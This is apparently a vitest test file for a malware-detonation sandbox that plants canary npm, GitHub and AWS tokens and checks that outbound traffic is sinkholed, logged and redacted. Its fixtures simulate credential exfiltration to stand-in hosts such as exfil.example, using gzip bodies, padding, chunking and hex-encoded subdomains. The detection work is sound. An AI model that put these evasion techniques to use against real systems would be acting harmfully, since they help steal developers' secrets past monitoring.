import { describe, expect, test, vi } from "vitest";

vi.mock("cloudflare:workers", () => {
  class Base {
    constructor(
      readonly ctx: unknown,
      readonly env: unknown,
    ) {}
  }
  return { WorkerEntrypoint: Base, DurableObject: Base };
});

const { canaryNeedles, findCanaryKinds, generateCanaries, redactCanaries } =
  await import("../server/lib/detonation/canaries");
const { DetonationEgress, evaluateDetonationEgress, isRegistryWrite } =
  await import("../server/lib/detonation/egress");
const { DetonationSandbox } = await import("../server/lib/detonation/sandbox-do");
type DetonationEgressEvent = import("../server/lib/detonation/types").DetonationEgressEvent;

function base64(text: string) {
  return Buffer.from(text, "utf8").toString("base64");
}

describe("canary needles", () => {
  const canaries = generateCanaries();
  const npmToken = canaries.env.NPM_TOKEN;
  const needles = canaryNeedles(canaries.values);

  test("plant the same npm token in the environment and ~/.npmrc", () => {
    const npmrc = canaries.files.find((file) => file.path.endsWith("/.npmrc"));
    expect(npmToken).toMatch(/^npm_[A-Za-z0-9]{36}$/);
    expect(npmrc?.content).toContain(npmToken);
  });

  test.each([
    ["raw", (payload: string) => payload],
    ["URL-encoded", (payload: string) => encodeURIComponent(payload)],
    ["hex", (payload: string) => Buffer.from(payload).toString("hex")],
    ["base64", base64],
    ["base64url", (payload: string) => Buffer.from(payload).toString("base64url")],
    ["double base64", (payload: string) => base64(base64(payload))],
  ])("find a %s token at every offset in a larger payload", (_name, encode) => {
    for (const prefix of ["", "x", "xy", '{"env":{"NPM_TOKEN":"']) {
      const payload = encode(`${prefix}${npmToken}","HOME":"/home/pkg"}}`);
      expect(findCanaryKinds(payload, needles)).toContain("npm-token");
    }
  });

  test("do not match unrelated text", () => {
    const other = generateCanaries();
    const payload = JSON.stringify(other.env) + base64(JSON.stringify(other.env));
    expect(findCanaryKinds(payload, needles)).toEqual([]);
  });

  test("redact every encoding of a token out of a recorded path", () => {
    const path = `/collect?t=${npmToken}&b=${base64(`xy${npmToken}`)}`;
    const redacted = redactCanaries(path, needles);
    expect(redacted).not.toContain(npmToken);
    expect(redacted).toContain("[canary:npm-token]");
  });
});

describe("detonation egress policy", () => {
  test("forwards only anonymous registry reads during prepare", () => {
    expect(evaluateDetonationEgress("prepare", "GET", "https://registry.npmjs.org/left-pad")).toBe(
      "forward",
    );
    expect(evaluateDetonationEgress("prepare", "PUT", "https://registry.npmjs.org/left-pad")).toBe(
      "sinkhole",
    );
    expect(evaluateDetonationEgress("prepare", "GET", "https://evil.example/registry")).toBe(
      "sinkhole",
    );
    expect(
      evaluateDetonationEgress("prepare", "GET", "https://registry.npmjs.org.evil.example/x"),
    ).toBe("sinkhole");
  });

  test("forwards nothing once package code runs", () => {
    expect(evaluateDetonationEgress("detonate", "GET", "https://registry.npmjs.org/left-pad")).toBe(
      "sinkhole",
    );
  });
});

describe("DetonationEgress", () => {
  function harness(phase: "prepare" | "detonate") {
    const canaries = generateCanaries();
    const recorded: DetonationEgressEvent[] = [];
    const sandbox = {
      currentPhase: async () => phase,
      recordEgress: async (event: DetonationEgressEvent) => void recorded.push(event),
    };
    const env = {
      DETONATION_SANDBOX: { idFromString: (id: string) => id, get: () => sandbox },
    };
    const ctx = { props: { sandboxId: "sandbox-1", canaries: canaries.values } };
    const Egress = DetonationEgress as unknown as new (
      ctx: unknown,
      env: unknown,
    ) => { fetch(request: Request): Promise<Response> };
    return { egress: new Egress(ctx, env), recorded, canaries };
  }

  test("sinkholes and records a gzip-compressed exfiltration attempt", async () => {
    const { egress, recorded, canaries } = harness("detonate");
    const fetchSpy = vi.spyOn(globalThis, "fetch");
    const body = new Blob([JSON.stringify({ env: canaries.env })])
      .stream()
      .pipeThrough(new CompressionStream("gzip"));
    const response = await egress.fetch(
      new Request(`https://exfil.example/c?k=${canaries.env.GITHUB_TOKEN}`, {
        method: "POST",
        headers: { "content-encoding": "gzip" },
        body,
        duplex: "half",
      } as RequestInit),
    );

    expect(response.status).toBe(200);
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(recorded).toHaveLength(1);
    expect(recorded[0]).toMatchObject({
      phase: "detonate",
      method: "POST",
      host: "exfil.example",
      path: "/c?k=[canary:github-token]",
      action: "sinkholed",
    });
    expect(recorded[0].canaryHits).toEqual(
      expect.arrayContaining(["npm-token", "github-token", "aws-key", "ci-oidc"]),
    );
    fetchSpy.mockRestore();
  });

  test("forwards a prepare-phase registry read without the container's headers", async () => {
    const { egress, recorded } = harness("prepare");
    const fetchSpy = vi
      .spyOn(globalThis, "fetch")
      .mockResolvedValue(new Response("{}", { status: 200 }));
    await egress.fetch(
      new Request("https://registry.npmjs.org/left-pad", {
        headers: { accept: "application/json", authorization: "Bearer leaked", "npm-session": "s" },
      }),
    );

    expect(fetchSpy).toHaveBeenCalledTimes(1);
    const [url, init] = fetchSpy.mock.calls[0] as [string, RequestInit];
    expect(url).toBe("https://registry.npmjs.org/left-pad");
    const headers = new Headers(init.headers);
    expect(headers.get("authorization")).toBeNull();
    expect(headers.get("npm-session")).toBeNull();
    expect(headers.get("accept")).toBe("application/json");
    expect(init.redirect).toBe("manual");
    expect(recorded[0]).toMatchObject({ action: "forwarded", phase: "prepare" });
    fetchSpy.mockRestore();
  });

  test("finds a token behind megabytes of padding and across chunk boundaries", async () => {
    const { egress, recorded, canaries } = harness("detonate");
    const token = canaries.env.NPM_TOKEN;
    const encoder = new TextEncoder();
    const body = new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue(encoder.encode("x".repeat(3 * 1024 * 1024)));
        controller.enqueue(encoder.encode(token.slice(0, 10)));
        controller.enqueue(encoder.encode(token.slice(10)));
        controller.close();
      },
    });
    await egress.fetch(
      new Request("https://exfil.example/upload", {
        method: "POST",
        body,
        duplex: "half",
      } as RequestInit),
    );
    expect(recorded[0].canaryHits).toEqual(["npm-token"]);
    expect(recorded[0].bodyBytes).toBeGreaterThan(3 * 1024 * 1024);
  });

  test("matches and redacts a token smuggled in a subdomain", async () => {
    const { egress, recorded, canaries } = harness("detonate");
    const hex = Buffer.from(canaries.env.GITHUB_TOKEN).toString("hex");
    await egress.fetch(new Request(`https://${hex.slice(0, 60)}.${hex.slice(60)}.exfil.example/`));
    expect(recorded[0].canaryHits).toContain("github-token");
    expect(recorded[0].host).not.toContain(hex.slice(0, 40));
  });

  test("keeps no fragment of a second canary split across labels", async () => {
    const { egress, recorded, canaries } = harness("detonate");
    const npm = Buffer.from(canaries.env.NPM_TOKEN).toString("hex");
    const github = Buffer.from(canaries.env.GITHUB_TOKEN).toString("hex");
    await egress.fetch(
      new Request(
        `https://${npm.slice(0, 60)}.${github.slice(0, 60)}.${github.slice(60)}.exfil.example/`,
      ),
    );
    expect(recorded[0].host).toBe("[canary:github-token].exfil.example");
  });
});

describe("isRegistryWrite", () => {
  test("treats a fully qualified registry host as the registry", () => {
    expect(isRegistryWrite({ host: "registry.npmjs.org.", method: "PUT" })).toBe(true);
    expect(isRegistryWrite({ host: "registry.npmjs.org", method: "GET" })).toBe(false);
  });
});

describe("DetonationSandbox egress record", () => {
  function sandbox() {
    const Sandbox = DetonationSandbox as unknown as new (
      ctx: unknown,
      env: unknown,
    ) => InstanceType<typeof DetonationSandbox>;
    return new Sandbox({}, {});
  }
  const event = (overrides: Partial<DetonationEgressEvent>): DetonationEgressEvent => ({
    phase: "detonate",
    method: "GET",
    host: "junk.example",
    path: "/",
    bodyBytes: 0,
    canaryHits: [],
    action: "sinkholed",
    ...overrides,
  });

  test("starts on the sinkhole policy before any run sets a phase", async () => {
    expect(await sandbox().currentPhase()).toBe("detonate");
  });

  test("keeps a canary event that arrives after the junk buckets are full", async () => {
    const object = sandbox();
    for (let i = 0; i < 500; i++) {
      await object.recordEgress(event({ phase: "prepare", path: `/p${i}` }));
      await object.recordEgress(event({ path: `/d${i}` }));
    }
    await object.recordEgress(event({ method: "POST", canaryHits: ["npm-token"], path: "/x" }));
    await object.recordEgress(
      event({ method: "PUT", host: "registry.npmjs.org", path: "/victim" }),
    );
    const internals = object as unknown as {
      priorityEgress: DetonationEgressEvent[];
      prepareEgress: DetonationEgressEvent[];
      detonateEgress: DetonationEgressEvent[];
      egressTruncated: boolean;
    };
    expect(internals.priorityEgress.map((e) => e.path)).toEqual(["/x", "/victim"]);
    expect(internals.prepareEgress).toHaveLength(50);
    expect(internals.detonateEgress).toHaveLength(200);
    expect(internals.egressTruncated).toBe(true);
  });
});
